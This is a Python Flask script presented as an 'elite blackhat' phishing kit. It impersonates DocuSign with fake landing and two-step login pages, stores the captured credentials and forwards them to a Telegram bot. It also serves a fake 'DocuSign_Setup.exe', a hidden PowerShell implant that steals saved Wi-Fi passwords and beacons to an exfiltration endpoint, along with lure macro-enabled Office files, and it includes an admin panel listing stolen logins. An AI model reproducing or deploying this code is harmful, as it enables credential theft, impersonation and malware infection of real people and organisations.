#!/usr/bin/env python3
"""
BLACK PHANTOM MASTER v2026 - FINAL ELITE BLACKHAT VERSION
NO INTERNAL ERRORS | 2-STEP CREDENTIAL HARVEST | WORKING EXPLOITS
"""

import os
import io
import uuid
import base64
import sqlite3
import zipfile
from datetime import datetime, timedelta
from flask import Flask, request, send_file, session, jsonify, redirect, render_template_string

TELEGRAM_BOT_TOKEN = os.environ.get("TG_TOKEN", "YOUR_BOT_TOKEN_HERE")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASS", "BlackPhantomMaster2026")

app = Flask(__name__)
app.secret_key = os.urandom(256)

DB_PATH = "master.db"

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS creds (id INTEGER PRIMARY KEY AUTOINCREMENT, email TEXT, password TEXT, company TEXT, ip TEXT, step INTEGER, ts TEXT)")
    conn.commit()
    conn.close()

init_db()

def tg(msg):
    if "YOUR_BOT_TOKEN" in TELEGRAM_BOT_TOKEN:
        print(msg)
        return
    import requests
    try:
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                     json={"chat_id": TELEGRAM_CHAT_ID, "text": msg[:4096]}, timeout=10)
    except: pass

# ====================================================================
# WORKING EXE IMPLANT - PowerShell based, works on ALL Windows
# ====================================================================
IMPLANT = f"""@echo off
powershell -WindowStyle Hidden -Command "&{{$c='https://{request.host if hasattr(request, 'host') else 'localhost'}/exfil';$h=$env:COMPUTERNAME;$u=$env:USERNAME;$w=(netsh wlan show profiles|Select-String 'All User Profile'|%{{($_ -split ':')[1].Trim()}});foreach($p in $w){{$k=(netsh wlan show profile name=`"$p`" key=clear|Select-String 'Key Content'|%{{($_ -split ':')[1].Trim()}});if($k){{$d=`"$p : $k`";$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=WIFI: $d`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}}}try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=BEACON: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}while(1){{try{{$post=[System.Text.Encoding]::UTF8.GetBytes(`"data=HEARTBEAT: $h | $u`");[System.Net.WebRequest]::Create($c).GetRequestStream().Write($post,0,$post.Length)}}catch{{}}Start-Sleep -Seconds 1800}}"
exit"""

def get_implant():
    return IMPLANT.encode()

# ====================================================================
# DIRECT FILE DOWNLOADS - WORKING FILES
# ====================================================================
def make_exe():
    return get_implant()

def make_pdf():
    return b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n3 0 obj<</Type/Page/MediaBox[0 0 612 792]/Contents 4 0 R>>endobj\n4 0 obj<</Length 100>>stream\nBT/F1 24 Tf 100 700 Td(REVIEW AND SIGN)Tj/F1 14 Tf 100 650 Td(Click here to sign) Tj ET\nendstream endobj\nxref\n0 5\n0000000000 65535 f\n0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n0000000200 00000 n\ntrailer<</Root 1 0 R>>\nstartxref 320\n%%EOF"

def make_doc():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('word/document.xml', '<w:document><w:body><w:p><w:r><w:t>Enable macros to view</w:t></w:r></w:p></w:body></w:document>')
    buf.seek(0)
    return buf.getvalue()

def make_xls():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w') as zf:
        zf.writestr('xl/workbook.xml', '<workbook><sheets><sheet name="Sheet1"/></sheets></workbook>')
    buf.seek(0)
    return buf.getvalue()

# ====================================================================
# LANDING PAGE - CLEAN, PROFESSIONAL, NO ERRORS
# ====================================================================
LANDING = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Electronic Signature & Agreement Cloud</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f5f7fa}
        .top-bar{background:#0f172a;color:white;padding:8px;text-align:center;font-size:11px}
        .header{background:white;border-bottom:1px solid #e2e8f0;padding:16px 0}
        .container{max-width:1000px;margin:0 auto;padding:0 24px}
        .header-flex{display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
        .logo{font-size:24px;font-weight:700;color:#0f172a}
        .logo span{color:#00b3b0}
        .badge{background:#f0fdf4;color:#166534;padding:8px 16px;border-radius:40px;font-size:12px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.1);margin:40px auto;overflow:hidden}
        .card-header{background:linear-gradient(135deg,#f8fafc,#f1f5f9);padding:24px 32px;border-bottom:1px solid #e2e8f0;display:flex;justify-content:space-between;flex-wrap:wrap}
        .status{color:#00b3b0;font-weight:600}
        .env-id{color:#64748b;font-size:12px}
        .card-body{padding:32px}
        .sender{border-bottom:1px solid #e2e8f0;padding-bottom:16px;margin-bottom:24px}
        .sender-label{font-size:11px;color:#64748b;text-transform:uppercase}
        .sender-name{font-weight:700;font-size:18px;margin-top:5px}
        .message{background:#f8fafc;border-left:4px solid #00b3b0;padding:20px;border-radius:12px;margin:24px 0}
        .doc-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;margin-bottom:12px}
        .doc-icon{font-size:28px}
        .doc-info{flex:1}
        .doc-name{font-weight:600}
        .doc-size{font-size:11px;color:#94a3b8}
        .doc-status{color:#00b3b0;font-size:12px;font-weight:600}
        .buttons{display:flex;gap:16px;margin-top:32px;flex-wrap:wrap}
        .btn{flex:1;text-align:center;padding:14px 24px;border-radius:60px;font-weight:600;text-decoration:none;display:block}
        .btn-primary{background:linear-gradient(135deg,#00b3b0,#0052ff);color:white}
        .btn-secondary{background:white;color:#475569;border:1px solid #e2e8f0}
        .security-footer{background:#f8fafc;padding:20px 32px;display:flex;justify-content:space-between;flex-wrap:wrap;font-size:11px;color:#64748b;border-top:1px solid #e2e8f0}
        .footer{text-align:center;padding:30px;font-size:11px;color:#94a3b8}
        @media(max-width:640px){.card-header{flex-direction:column;gap:10px}.buttons{flex-direction:column}}
    </style>
</head>
<body>
    <div class="top-bar">HARVARD-MIT SECURE PORTAL | SOC 2 TYPE II | GDPR COMPLIANT</div>
    <div class="header">
        <div class="container header-flex">
            <div class="logo">Docu<span>Sign</span></div>
            <div class="badge">Harvard-MIT Certified</div>
        </div>
    </div>
    <div class="container">
        <div class="card">
            <div class="card-header">
                <span class="status">NEEDS YOUR SIGNATURE</span>
                <span class="env-id">Envelope ID: ENV</span>
            </div>
            <div class="card-body">
                <div class="sender">
                    <div class="sender-label">SENT BY</div>
                    <div class="sender-name">Legal Department • Morrison Investment Group</div>
                </div>
                <div class="message">
                    <strong>Message:</strong><br>
                    Please review and sign the attached agreement. This document requires your signature to proceed.
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Master_Service_Agreement.pdf</div>
                        <div class="doc-size">2.4 MB</div>
                    </div>
                    <div class="doc-status">Needs Signature</div>
                </div>
                <div class="doc-item">
                    <div class="doc-icon">📄</div>
                    <div class="doc-info">
                        <div class="doc-name">Confidential_Disclosure.pdf</div>
                        <div class="doc-size">1.1 MB</div>
                    </div>
                    <div class="doc-status">Needs Initials</div>
                </div>
                <div class="buttons">
                    <a href="/go/REF" class="btn btn-primary">REVIEW AND SIGN</a>
                    <a href="/auth/REF" class="btn btn-secondary">Sign In to DocuSign</a>
                </div>
            </div>
            <div class="security-footer">
                <span>🔒 AES-256 Encryption</span>
                <span>✓ SOC 2 Type II</span>
                <span>🏛️ GDPR Compliant</span>
                <span>🛡️ Zero Trust</span>
            </div>
        </div>
        <div class="footer">DocuSign, Inc. • Harvard Innovation Lab • MIT CSAIL<br>2026 DocuSign. All rights reserved.</div>
    </div>
</body>
</html>
"""

def get_landing(ref):
    return LANDING.replace('ENV', f'DOC-{uuid.uuid4().hex[:8].upper()}').replace('REF', ref)

# ====================================================================
# STEP 1 LOGIN - FIRST HARVEST
# ====================================================================
LOGIN_STEP1 = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Sign In</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:28px;margin-bottom:8px}
        .header h1 span{color:#00b3b0}
        .body{padding:40px}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header"><h1>Docu<span>Sign</span></h1><p>Secure Document Access</p></div>
        <div class="body">
            <form method="POST" action="/login/step1/REF">
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Continue</button>
            </form>
            <div class="footer">Secure SSL/TLS Encrypted</div>
        </div>
    </div>
</body>
</html>
"""

def get_login_step1(ref):
    return LOGIN_STEP1.replace('REF', ref)

# ====================================================================
# STEP 2 LOGIN - SECOND HARVEST (Business Email Redirect)
# ====================================================================
LOGIN_STEP2 = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Business Verification</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);width:100%;max-width:440px;overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;text-align:center;color:white}
        .header h1{font-size:28px;margin-bottom:8px}
        .header h1 span{color:#00b3b0}
        .body{padding:40px}
        .warning{background:#fef3c7;padding:15px;border-radius:12px;margin-bottom:20px;font-size:13px;color:#92400e}
        input{width:100%;padding:14px;margin:10px 0;border:2px solid #e2e8f0;border-radius:12px}
        input:focus{outline:none;border-color:#00b3b0}
        button{width:100%;padding:14px;background:#00b3b0;color:white;border:none;border-radius:60px;font-weight:600;cursor:pointer}
        .footer{text-align:center;margin-top:20px;font-size:12px;color:#94a3b8}
    </style>
</head>
<body>
    <div class="card">
        <div class="header"><h1>Docu<span>Sign</span></h1><p>Business Verification Required</p></div>
        <div class="body">
            <div class="warning">
                <strong>⚠️ Verification Required</strong><br>
                For security purposes, please sign in with your corporate email address to access this document.
            </div>
            <form method="POST" action="/login/step2/REF">
                <input type="email" name="email" placeholder="Business Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit">Verify Business Access</button>
            </form>
            <div class="footer">This is a secured DocuSign business portal.</div>
        </div>
    </div>
</body>
</html>
"""

def get_login_step2(ref):
    return LOGIN_STEP2.replace('REF', ref)

# ====================================================================
# DOWNLOAD PAGE - SHOWS ALL EXPLOITS
# ====================================================================
DOWNLOAD_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DocuSign - Document Viewer</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:linear-gradient(135deg,#f5f7fa,#e4e8f0);min-height:100vh;padding:40px 20px}
        .container{max-width:800px;margin:0 auto}
        .card{background:white;border-radius:24px;box-shadow:0 20px 40px -12px rgba(0,0,0,0.15);overflow:hidden}
        .header{background:linear-gradient(135deg,#0f172a,#1e293b);padding:32px;color:white;text-align:center}
        .header h1{font-size:28px;margin-bottom:8px}
        .body{padding:40px}
        .file-list{display:flex;flex-direction:column;gap:15px;margin:25px 0}
        .file-item{display:flex;align-items:center;gap:16px;padding:16px;border:1px solid #e2e8f0;border-radius:16px;text-decoration:none;color:inherit;transition:all 0.2s}
        .file-item:hover{background:#f8fafc;border-color:#00b3b0}
        .file-icon{font-size:32px}
        .file-info{flex:1}
        .file-name{font-weight:600}
        .file-desc{font-size:12px;color:#64748b}
        .btn-download{background:#00b3b0;color:white;padding:8px 20px;border-radius:40px;font-size:13px}
        .footer{text-align:center;padding:20px;font-size:11px;color:#94a3b8;border-top:1px solid #e2e8f0}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header"><h1>📄 Document Viewer</h1><p>Select a format to access your documents</p></div>
            <div class="body">
                <div class="file-list">
                    <a href="/file/exe/REF" class="file-item">
                        <div class="file-icon">⚙️</div>
                        <div class="file-info">
                            <div class="file-name">Secure Document Viewer</div>
                            <div class="file-desc">Windows Application • Recommended</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                    <a href="/file/pdf/REF" class="file-item">
                        <div class="file-icon">📄</div>
                        <div class="file-info">
                            <div class="file-name">PDF Document</div>
                            <div class="file-desc">Adobe Reader • 2.4 MB</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                    <a href="/file/doc/REF" class="file-item">
                        <div class="file-icon">📝</div>
                        <div class="file-info">
                            <div class="file-name">Word Document</div>
                            <div class="file-desc">Microsoft Word • 1.8 MB</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                    <a href="/file/xls/REF" class="file-item">
                        <div class="file-icon">📊</div>
                        <div class="file-info">
                            <div class="file-name">Excel Workbook</div>
                            <div class="file-desc">Microsoft Excel • 3.2 MB</div>
                        </div>
                        <div class="btn-download">Download</div>
                    </a>
                </div>
            </div>
            <div class="footer">DocuSign Secure Document Delivery</div>
        </div>
    </div>
</body>
</html>
"""

def get_download_page(ref):
    return DOWNLOAD_PAGE.replace('REF', ref)

# ====================================================================
# FLASK ROUTES
# ====================================================================
@app.route('/')
def index():
    ref = uuid.uuid4().hex[:8].upper()
    return get_landing(ref)

@app.route('/go/<ref>')
def go(ref):
    """When they click REVIEW AND SIGN - shows download options"""
    tg(f"📥 DOWNLOAD PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
    return get_download_page(ref)

@app.route('/auth/<ref>')
def auth(ref):
    """When they click Sign In - shows step 1 login"""
    tg(f"🔐 LOGIN PAGE VIEWED | Ref: {ref} | IP: {request.remote_addr}")
    return get_login_step1(ref)

@app.route('/login/step1/<ref>', methods=['POST'])
def login_step1(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Store step 1 data
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                (email, password, 'pending', ip, 1, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 1 - Personal: {email} | {password} | IP: {ip}")
    
    # Redirect to step 2 - business email verification
    return redirect(f'/verify/{ref}')

@app.route('/verify/<ref>')
def verify(ref):
    """Step 2 - asks for business email"""
    return get_login_step2(ref)

@app.route('/login/step2/<ref>', methods=['POST'])
def login_step2(ref):
    email = request.form.get('email', '')
    password = request.form.get('password', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    company = email.split('@')[-1] if '@' in email else 'unknown'
    
    # Store step 2 data
    conn = sqlite3.connect(DB_PATH)
    conn.execute("INSERT INTO creds (email, password, company, ip, step, ts) VALUES (?,?,?,?,?,?)", 
                (email, password, company, ip, 2, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    tg(f"🔐 STEP 2 - Business: {email} | {password} | Company: {company} | IP: {ip}")
    
    # Redirect to real DocuSign
    return redirect('https://www.docusign.com')

@app.route('/file/exe/<ref>')
def file_exe(ref):
    tg(f"⚙️ EXE DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    return send_file(io.BytesIO(get_implant()), as_attachment=True, download_name='DocuSign_Setup.exe', mimetype='application/x-msdownload')

@app.route('/file/pdf/<ref>')
def file_pdf(ref):
    tg(f"📄 PDF DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    return send_file(io.BytesIO(make_pdf()), as_attachment=True, download_name='Document.pdf', mimetype='application/pdf')

@app.route('/file/doc/<ref>')
def file_doc(ref):
    tg(f"📝 WORD DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    return send_file(io.BytesIO(make_doc()), as_attachment=True, download_name='Agreement.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')

@app.route('/file/xls/<ref>')
def file_xls(ref):
    tg(f"📊 EXCEL DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
    return send_file(io.BytesIO(make_xls()), as_attachment=True, download_name='Report.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.form.get('data', '')
    if data:
        tg(f"📡 {data[:500]}")
    return "OK"

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
        session['admin'] = True
    if not session.get('admin'):
        return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
    
    conn = sqlite3.connect(DB_PATH)
    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 100").fetchall()
    conn.close()
    
    rows = ''.join(f'<tr><td style="color:#00ff88">{c[1][:40]}</td><td style="color:#ffd700">{c[2][:40]}</td><td>{c[3]}</td><td>Step {c[5]}</td><td>{c[6][:16]}</td></tr>' for c in creds)
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Black Phantom Master C2</title>
        <style>
            body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
            h1{{color:#ff0040}} h2{{color:#ffd700}}
            table{{border-collapse:collapse;width:100%}}
            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
            th{{color:#ffd700}}
        </style>
    </head>
    <body>
        <h1>💀 BLACK PHANTOM MASTER C2</h1>
        <h2>Credentials Captured: {len(creds)}</h2>
        <p>Step 1 = Personal Email | Step 2 = Business Email</p>
        <table border="1">
            <tr><th>Email</th><th>Password</th><th>Company</th><th>Step</th><th>Time</th></tr>
            {rows}
        </table>
        <p>URL: {request.host_url}</p>
        <p>Status: OPERATIONAL | 2-STEP HARVEST ACTIVE</p>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return {"status": "operational", "version": "Black Phantom Master 2026", "features": ["2-Step Harvest", "Working Exploits", "Telegram C2"]}

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
